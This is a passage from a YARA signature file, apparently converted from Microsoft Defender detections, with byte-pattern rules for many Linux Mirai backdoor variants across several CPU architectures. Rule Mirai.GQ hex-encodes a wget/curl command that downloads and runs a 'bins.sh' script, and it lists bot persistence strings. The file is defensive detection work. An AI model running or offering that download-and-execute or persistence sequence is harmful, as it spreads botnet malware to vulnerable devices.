        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8a 44 1a ff 3c fd 75 ?? c6 44 1a ff fc eb ?? 3c fb 75 ?? c6 44 1a ff fd 42 83 fa 04}  //weight: 1, accuracy: Low
        $x_1_2 = {66 3b 50 08 72 ?? 66 3b 50 0a 72 ?? 41 83 c0 10 39 d9 7c ?? 31 c0 89 07}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FV_2147906265_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FV!MTB"
        threat_id = "2147906265"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 40 d1 d1 bb 10 20 40 d1 d1 b9 10 20 40 d1 d1 b7 10 20 40 d1 d1 b5 10 52 80 42 81 32 29 00 04 b0 81}  //weight: 1, accuracy: High
        $x_1_2 = {20 6e 00 08 30 10 00 40 00 08 22 6e 00 08 32 80 20 6e 00 08 20 28 00 0c 22 00 22 6e 00 08 20 29 00 08 24 01 94 80 2d 42 ff f8 4a ae ff f8 ?? ?? 20 2e ff f8 b0 ae ff f0 ?? ?? 2d 6e ff f0 ff f8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FW_2147906266_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FW!MTB"
        threat_id = "2147906266"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {04 00 42 92 00 00 43 8e 05 00 52 26 14 00 a2 a0 04 00 a3 ac 10 00 a3 ac 00 00 a6 a4 f8 ?? ?? ?? 18 00 a5 24 21 10 d7 02 23 10 22 02 fa ff 54 24}  //weight: 1, accuracy: Low
        $x_1_2 = {02 1a 15 00 18 00 bc 8f 00 ff 63 30 00 ff a5 32 02 26 15 00 00 00 40 ac 00 36 15 00 25 20 83 00 24 00 a2 8f 28 00 a3 8f 00 2a 05 00 25 28 a6 00 f4 81 99 8f 20 00 a7 8f 25 20 85 00 10 00 b6 af 14 00 a2 af ff 00 65 30}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GH_2147906267_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GH!MTB"
        threat_id = "2147906267"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {58 82 99 8f 00 00 a0 a0 09 f8 20 03 21 20 c0 02 18 00 bc 8f 21 20 c0 02 58 82 99 8f 2c 00 a0 af 30 00 a0 af 34 00 a0 af 38 00 a0 af 09 f8 20 03 21 88 c2 02 18 00 bc 8f 11 00 42 24}  //weight: 1, accuracy: High
        $x_1_2 = {58 82 99 8f d4 10 a4 8f 09 f8 20 03 00 00 00 00 d4 10 a4 8f bc 08 a3 97 21 10 82 00 05 00 46 24 c0 10 a2 8f 18 00 bc 8f d5 ff ?? ?? ?? b0 80 00 c2 08 a3 97}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FK_2147906316_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FK!MTB"
        threat_id = "2147906316"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {60 30 9f e5 00 00 53 e3 03 ?? ?? ?? 0f e0 a0 e1 03 f0 a0 e1 00 30 a0 e3 00 30 80 e5 18 30 9f e5 06 10 a0 e1 00 20 93 e5 08 00 a0 e1 0f e0 a0 e1 0a f0 a0 e1 83 fe ff eb}  //weight: 1, accuracy: Low
        $x_1_2 = {0f 00 00 0a 01 c0 53 e2 0d ?? ?? ?? 02 0b 1e e3 0b ?? ?? ?? 01 00 5c e3 21 ?? ?? ?? 28 30 ?? e5 00 00 53 e3 1e ?? ?? ?? 03 30 d0 e5 2c 20 ?? e5 0c 30 63 e0 00 00 52 e3 01 c0 43 e2 02 30 d0 c5 0c c0 63 c0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FR_2147906384_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FR!MTB"
        threat_id = "2147906384"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {30 40 2d e9 10 20 ?? e5 18 30 ?? e5 03 00 52 e1 00 40 a0 e1 08 51 9f e5 01 00 d2 34 05 50 8f e0 0c d0 4d e2 10 20 84 35 3a ?? ?? ?? b0 30 d4 e1 83 30 03 e2 80 00 53 e3 03 ?? ?? ?? 80 10 a0 e3 6a 04 00 eb 00 00 50 e3}  //weight: 1, accuracy: Low
        $x_1_2 = {10 10 84 e2 0a 00 91 e8 01 00 53 e1 01 00 d1 14 10 10 84 15 20 ?? ?? ?? 04 30 94 e5 02 00 73 e3 04 30 82 03 00 00 e0 03 b0 30 c4 01 1a ?? ?? ?? 03 0c 12 e3 70 30 9f 15 03 00 95 17 e5 fe ff 1b 08 20 84 e2 0c 00 92 e8 02 00 53 e1 0a ?? ?? ?? 18 20 84 e5 04 00 a0 e1 39 04 00 eb 00 00 50 e3 0c ?? ?? ?? 14 30 94 e5 18 30 84 e5 10 30 94 e5 01 00 d3 e4 10 30 84 e5}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GN_2147906385_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GN!MTB"
        threat_id = "2147906385"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {e6 2f 22 4f 07 d0 f4 7f f3 6e 42 2e 51 1e 66 e4 62 1e 03 e5 0b 40 e3 66 0c 7e e3 6f 26 4f f6 6e}  //weight: 1, accuracy: High
        $x_1_2 = {53 61 63 67 13 66 04 d1 e6 2f 43 65 f3 6e 04 e4 e3 6f f6 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GW_2147906386_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GW!MTB"
        threat_id = "2147906386"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {20 6e ff dc 2d 68 00 08 ff e0 20 6e ff dc 21 6e ff d4 00 08 20 6e ff e0 21 6e ff d4 00 0c 70 01 80 ae ff e8 20 6e ff d4 21 40 00 04 20 6e ff d4 21 6e ff dc 00 0c 20 6e ff d4 21 6e ff e0 00 08 22 2e ff d4 20 2e ff e8 d0 81 20 40 20 ae ff e8}  //weight: 1, accuracy: High
        $x_1_2 = {70 34 d0 ae ff d0 2d 40 ff f0 20 6e ff f0 2d 68 00 08 ff f4 20 6e ff d4 21 6e ff f0 00 0c 20 6e ff d4 21 6e ff f4 00 08 20 6e ff f0 21 6e ff d4 00 08 20 6e ff f4 21 6e ff d4 00 0c 70 01 80 ae ff d8 20 6e ff d4 21 40 00 04 22 2e ff d4 20 2e ff d8 d0 81 20 40 20 ae ff d8}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GZ_2147906488_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GZ!MTB"
        threat_id = "2147906488"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {05 00 1c 3c 48 84 9c 27 21 e0 99 03 d0 ff bd 27 28 00 bf af 10 00 bc af 5c 80 99 8f 18 00 a4 af 1c 00 a5 af 20 00 a6 af 06 10 04 24 18 00 a6 27 09 f8 20 03 01 00 05 24 10 00 bc 8f 28 00 bf 8f 00 00 00 00 08 00 e0 03 30 00 bd 27}  //weight: 1, accuracy: High
        $x_1_2 = {ff 00 a5 30 00 2c 05 00 00 26 04 00 25 20 85 00 ff 00 e7 30 ff 00 c6 30 25 20 87 00 00 32 06 00 25 30 c4 00 02 22 06 00 00 ff c3 30 00 1a 03 00 00 ff 84 30 00 16 06 00 02 36 06 00 25 10 43 00 25 30 c4 00 08 00 e0 03 25 10 46 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HC_2147906489_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HC!MTB"
        threat_id = "2147906489"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0c d7 0b e6 0c d5 72 61 52 63 13 62 6d 42 0b d6 1a 22 33 60 62 61 12 27 09 d7 ed e1 1d 40 3a 20 72 61 2a 20 32 27 19 42 12 26 2a 20 02 25}  //weight: 1, accuracy: High
        $x_1_2 = {86 2f 00 e1 96 2f 00 e2 a6 2f 43 6a b6 2f 22 4f 41 50 f0 7f 12 1f 23 1f ff 88 12 2f 21 1f 04 8d f3 6b 03 64 1d d0 0b 40}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HF_2147906490_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HF!MTB"
        threat_id = "2147906490"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2d 6e 00 1c ff d8 50 ae 00 1c 51 ae 00 20 72 0f b2 ae ff fc ?? ?? 70 22 2d 40 ff d0 60 00 ?? ?? 2d 6e ff f8 ff dc 72 10 d3 ae ff f8 70 f0 d1 ae ff fc 72 07 b2 ae ff fc ?? ?? 70 22 2d 40 ff d0}  //weight: 1, accuracy: Low
        $x_1_2 = {20 6e ff f4 12 10 20 6e ff f8 10 10 b0 01 ?? ?? 52 ae ff f8 20 6e ff f8 10 10 4a 00 ?? ?? 20 6e ff f8 10 10 4a 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GV_2147906728_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GV!MTB"
        threat_id = "2147906728"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {80 10 12 00 21 10 50 00 02 00 43 2a 39 ?? ?? ?? 00 00 40 ac 54 00 a3 8f 01 00 02 24 3d ?? ?? ?? 02 00 02 24 12 ?? ?? ?? 01 00 11 24 98 80 99 8f 00 00 05 8e 4c 00 a4 8f 09 f8 20 03}  //weight: 1, accuracy: Low
        $x_1_2 = {0f 00 84 30 80 18 03 00 2b 10 02 00 c0 20 04 00 25 18 64 00 40 10 02 00 2b 28 05 00 25 28 a3 00 25 10 c2 00 25 10 45 00 02 00 02 a1 18 00 e2 8c 00 00 00 00 02 ?? ?? ?? 80 ff 03 24 21 18 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GX_2147906729_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GX!MTB"
        threat_id = "2147906729"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {24 02 00 01 24 03 00 02 10 ?? ?? ?? ae e2 00 24 14 ?? ?? ?? 24 06 00 04 14 ?? ?? ?? 26 a4 00 04 10 ?? ?? ?? 24 45 00 04}  //weight: 1, accuracy: Low
        $x_1_2 = {03 20 f8 09 24 06 00 0a 8f bc 00 10 10 ?? ?? ?? 00 00 00 00 93 a3 02 64 00 00 00 00 14 ?? ?? ?? 24 02 00 05 12 ?? ?? ?? 2e 62 00 03 93 a3 02 65 14 40 00 61 24 02 00 05 18 ?? ?? ?? 00 60 88 21}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HE_2147906730_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HE!MTB"
        threat_id = "2147906730"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f0 41 2d e9 74 31 9f e5 98 d0 4d e2 00 80 a0 e3 00 00 00 ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 e2 fa ?? ?? ?? 54 11 9f e5}  //weight: 1, accuracy: Low
        $x_1_2 = {01 00 70 e3 01 00 77 13 00 50 a0 e1 01 00 a0 03 ?? ff ff 0b 05 00 a0 e1 84 10 8d e2 10 20 a0 e3 a7 ff ff eb 00 40 50 e2 05 ?? ?? ?? 01 00 a0 e3 d8 10 9f e5 04 20 a0 e3 ad ff ff eb 00 00 64 e2 84 ff ff eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FU_2147906807_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FU!MTB"
        threat_id = "2147906807"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4e 56 00 00 4a ae 00 0c 67 0c 20 6e 00 08 10 28 00 40 4a 00 66 3e 4a ae 00 0c 66 16 20 6e 00 08 20 28 00 1c 2f 2e 00 08 2f 00 61 ff 00 00 38 1a 50 8f 20 6e 00 08 21 6e 00 0c 01 ba 4a ae 00 0c 66 12 20 6e 00 08 20 28 00 1c 2f 00 61 ff 00 00 37 0e 58 8f}  //weight: 1, accuracy: High
        $x_1_2 = {42 80 10 10 d6 80 20 02 02 80 00 00 ff ff 42 42 48 42 d0 82 24 04 42 42 48 42 d4 83 02 84 00 00 ff ff d0 84 42 81 12 29 00 09 d4 81 42 81 32 05 d0 81 d0 82 22 00 42 41 48 41 4a 81 66 ae}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GY_2147906812_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GY!MTB"
        threat_id = "2147906812"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {21 e0 99 03 d8 ff bd 27 20 00 bf af 1c 00 b1 af 18 00 b0 af 10 00 bc af 21 80 a0 00 30 80 99 8f 21 88 80 00 21 28 00 00 21 20 00 02 09 f8 20 03 98 00 06 24 00 00 22 8e 10 00 bc 8f 04 00 00 ae 00 00 02 ae 10 00 22 8e}  //weight: 1, accuracy: High
        $x_1_2 = {ff ff 4a 25 00 00 42 a1 ff ff c6 24 fb ?? ?? ?? ff ff a5 24 01 00 a5 24 21 10 00 02 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HD_2147906813_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HD!MTB"
        threat_id = "2147906813"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {04 10 a0 e1 80 20 a0 e3 05 00 a0 e1 9b ff ff eb 00 20 50 e2 04 10 a0 e1 07 00 a0 e1 01 ?? ?? ?? 8b ff ff eb f5 ?? ?? ?? 05 00 a0 e1 69 ff ff eb 07 00 a0 e1 67 ff ff eb 3c 10 9f e5 04 20 a0 e3 01 00 a0 e3 82 ff ff eb 05 00 a0 e3 59 ff ff eb 98 d0 8d e2 f0 41 bd e8}  //weight: 1, accuracy: Low
        $x_1_2 = {20 21 9f e5 20 01 9f e5 aa ff ff eb 01 10 a0 e3 00 70 a0 e1 06 20 a0 e1 02 00 a0 e3 d2 ff ff eb 01 00 70 e3 01 00 77 13 00 50 a0 e1 01 00 a0 03 ?? ff ff 0b 05 00 a0 e1 84 10 8d e2 10 20 a0 e3 a7 ff ff eb 00 40 50 e2 05 ?? ?? ?? 01 00 a0 e3 d8 10 9f e5 04 20 a0 e3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GC_2147906930_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GC!MTB"
        threat_id = "2147906930"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {21 30 60 01 21 58 80 01 21 60 e0 00 21 38 60 00 c0 1a 06 00 c2 2c 07 00 26 18 c3 00 26 28 e5 00 26 28 65 00 04 00 02 29 02 1a 03 00 21 20 60 00 ef ?? ?? ?? 26 18 65 00 0b ?? ?? ?? 26 18 85 00 00 00 43 a5 fe ff 08 25}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GQ_2147906931_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GQ!MTB"
        threat_id = "2147906931"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 62 69 6e 2f 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-16] 2e ?? ?? ?? 2f 62 69 6e 73 2e 73 68 3b 20 63 68 6d 6f 64 20 2b 78 20 62 69 6e 73 2e 73 68 3b 20 73 68 20 62 69 6e 73 2e 73 68 3b 20 2f 62 69 6e 2f 63 75 72 6c 20 2d 6b 20 2d 4c 20 2d 2d 6f 75 74 70 75 74 20 62 69 6e 73 2e 73 68 20 68 74 74 70 3a 2f 2f [0-16] 2e ?? ?? ?? 2f 62 69 6e 73 2e 73 68 3b 20 63 68 6d 6f 64 20 2b 78 20 62 69 6e 73 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_2 = "/bin/systemctl enable bot" ascii //weight: 1
        $x_1_3 = "/lib/systemd/system/bot.service" ascii //weight: 1
        $x_1_4 = "/etc/init/bot.conf" ascii //weight: 1
        $x_1_5 = "/sbin/initctl start bot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_HK_2147907058_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HK!MTB"
        threat_id = "2147907058"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 ae ff f0 20 6e ff f0 1d 50 ff f9 53 ae ff ec 53 ae ff f4 20 6e ff ec 10 ae ff f9 4a ae ff f4 ?? ?? 70 03 c0 ae ff f0 4a 80 ?? ?? 20 2e 00 10 e4 88 22 2e ff f0 20 6e ff ec 2f 00 2f 01 2f 08}  //weight: 1, accuracy: Low
        $x_1_2 = {4a ae ff f0 56 c0 14 00 49 c2 2d 42 ff ec 20 2e ff ec 44 80 2d 40 ff ec 20 2e ff ec 4a 80 ?? ?? 20 6e ff f0 20 2e 00 08 20 80 20 2e ff f0 22 00 58 81 2d 41 ff f0 20 2e ff f0 20 40 24 2e ff d8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HM_2147907059_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HM!MTB"
        threat_id = "2147907059"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {98 88 99 8f 50 00 a5 8f 21 20 c0 02 09 f8 20 03 10 00 06 24 20 00 bc 8f 0a 00 02 24 28 00 a4 8f 50 81 99 8f 08 00 62 ae 10 00 02 24 00 00 71 ae 0c 00 62 ae 09 f8 20 03 10 00 77 ae 20 00 bc 8f 21 20 00 00 a4 00 a2 8f}  //weight: 1, accuracy: High
        $x_1_2 = {18 00 c3 00 98 80 99 8f 24 00 44 26 12 30 00 00 09 f8 20 03 21 28 20 02 60 00 a2 8f 4c 00 a3 8f 20 00 bc 8f 18 00 43 00 12 10 00 00 21 a0 22 02 00 00 92 ae 60 00 a2 8f 09 ?? ?? ?? ff ff 43 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HA_2147907234_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HA!MTB"
        threat_id = "2147907234"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {04 11 00 a5 27 fe 00 00 27 bd ff fc af bf 00 00 00 a4 28 20 ac e6 00 00 3c 0d 80 00 01 a0 48 21 24 0b 00 01 04 11 00 42 24 0f 00 01 11 c0 00 05 90 8e 00 00 24 84 00 01 24 c6 00 01}  //weight: 1, accuracy: High
        $x_1_2 = {8c e3 00 00 00 85 c0 23 8f bf 00 00 af b8 00 00 00 60 20 21 00 c3 28 23 ac e5 00 00 24 06 00 03 24 02 10 33 00 00 00 0c 8f a2 00 00 03 e0 00 08 27 bd 00 04 24 06 00 1e 04 11 00 0c 03 e0 28 21 50 52 4f 54 5f 45 58 45 43 7c 50 52 4f 54 5f 57 52 49 54 45 20 66 61 69 6c 65 64 2e 0a 00 0a 00 0a 00 34 2e 30 30 32 30 32 31 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JZ_2147907307_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JZ!MTB"
        threat_id = "2147907307"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {93 36 60 10 40 00 0c c3 90 10 00 10 94 10 00 1a d0 06 c0 12 92 10 00 10 40 00 26 95 17 00 00 10 a8 05 20 01 80 a5 00 18 02 bf ff dd b6 06 e0 04 10 bf ff f4}  //weight: 1, accuracy: High
        $x_1_2 = {e2 06 c0 13 92 10 23 e8 40 00 0c 39 90 10 22 bc a1 2a 20 10 90 10 00 11 a1 34 20 10 40 00 0c 53 92 10 00 10 94 10 00 10 d0 06 c0 12 92 10 00 11 40 00 26 25 17 00 00 10 b4 06 a0 01 80 a6 80 18 12 bf ff f0 b6 06 e0 04 80 a6 20 00 04 bf ff ea b4 10 20 00 10 bf ff eb}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FI_2147907426_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FI!MTB"
        threat_id = "2147907426"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 ae ff ec 20 2e 00 10 55 80 72 22 b2 80 65 00 ?? ?? 22 2e 00 10 70 ff 24 00 4c 41 20 00 1d 40 ff fb 20 2e 00 10 74 ff 4c 40 20 01 20 02 2d 40 ff f0 60 00 00 02}  //weight: 1, accuracy: Low
        $x_1_2 = {4a ae ff f8 ?? ?? 48 78 00 11 20 0e 06 80 ff ff ff 60 2f 00 61 ff ff ff f0 a4 50 8f 4a 80 ?? ?? 70 ff 2d 40 fe 4c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FM_2147907427_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FM!MTB"
        threat_id = "2147907427"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {c2 1a 08 00 c2 24 08 00 c2 10 02 00 1f 00 63 30 1f 00 84 30 c2 2e 08 00 21 10 c2 01 21 18 c3 01 21 28 c5 01 21 20 c4 01 00 00 46 ?? 00 00 67 ?? 00 00 82 ?? 00 00 a3 ?? fc ff 6b 25 00 00 46 a1 01 00 47 a1 02 00 42 a1 03 00 43 a1 21 28 80 01 19 ?? ?? ?? 04 00 4a 25}  //weight: 1, accuracy: Low
        $x_1_2 = {c0 1a 06 00 c2 2c 07 00 26 18 c3 00 26 28 e5 00 26 28 65 00 04 00 02 29 02 1a 03 00 21 20 60 00 ef ?? ?? ?? 26 18 65 00 0b ?? ?? ?? 26 18 85 00 00 00 43 a5 fe ff 08 25 ec ?? ?? ?? 02 00 4a 25}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GB_2147907428_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GB!MTB"
        threat_id = "2147907428"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {61 ff 00 00 08 28 2d 40 ff f8 61 ff 00 00 07 a6 2d 40 ff fc 20 2e ff f8 b0 ae ff fc ?? ?? 70 01 2d 40 ff ec}  //weight: 1, accuracy: Low
